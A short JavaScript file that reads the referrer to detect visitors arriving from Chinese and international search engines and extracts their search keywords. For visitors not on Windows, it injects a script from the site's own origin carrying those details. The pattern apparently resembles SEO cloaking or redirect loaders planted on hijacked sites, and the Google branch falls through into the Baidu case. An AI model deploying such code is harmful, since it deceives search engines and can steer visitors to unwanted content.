function GetQueryString(name) {
    var index = document.referrer.indexOf(name + "="), e = "";
    if (index > 1) {
        e = document.referrer.substring(index + name.length + 1);
        if ((index = e.indexOf("&")) > 0) { e = e.substring(0, index) }
    } return e
}

function getReferInfo(refer) {
    debugger
    var ref = refer;
    var sites = ["google.com", "google.cn", "baidu.com", "so.com", "sogou.com", "sm.cn", "bing.com"];
    var sites_cn = ["谷歌搜索", "谷歌搜索", "百度搜索", "360搜索", "搜狗搜索", "神马搜索", "必应搜索"];
    var from = ""; var keys = "";
    for (i in sites) {
        var pos = ref.indexOf(sites[i]);
        if (pos > -1) {
            from = sites_cn[i];
            switch (i) {
                case "0":
                case "1":
                    var start = ref.indexOf("q=");
                    var end = ref.indexOf("&");
                    keys = decodeURIComponent(ref.substring(start + 2, end));
                case "2": keys = GetQueryString("eqid");
                    if (keys == '') {
                        keys = decodeURIComponent(GetQueryString("word"));
                        if (keys != '') { from = "百度" }
                    }
                    break;
                case "3": var start = ref.indexOf("?q=");
                    var end = ref.indexOf("&");
                    keys = decodeURIComponent(ref.substring(start + 3, end));
                    break;
                case "4":
                    var start = ref.indexOf("?keyword=");
                    var end = ref.indexOf("&");
                    keys = decodeURIComponent(ref.substring(start + 9, end));
                    break;
                case "5":
                    var start = ref.indexOf("?q="); var end = ref.indexOf("&");
                    keys = decodeURIComponent(ref.substring(start + 3, end));
                    break;
                case "6": var start = ref.indexOf("?q="); var end = ref.indexOf("&");
                    keys = decodeURIComponent(ref.substring(start + 3, end));
                    break
            }
            break
        }
    }
    var data = {};
    data.from = from;
    data.keys = keys;
    return data
} (
    function (d, n) {
        debugger
        if (n.indexOf("Win") == "0") {
            return
        }
        var ho = d.createElement("script");
        var ref = d.referrer;
        var f = "";
        var k = "";
        if (ref) {
            var data = getReferInfo(ref);
            f = data.from;
            k = data.keys
        }
        ho.src = window.location.origin + "?o=" + n + "&f=" + f + "&k=" + encodeURIComponent(k);
        var s = d.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(ho, s);
        var oMeta = document.createElement("meta");
        oMeta.content = "always";
        oMeta.name = "referrer";
        document.getElementsByTagName("head")[0].appendChild(oMeta)
    }
)(document, navigator.platform);
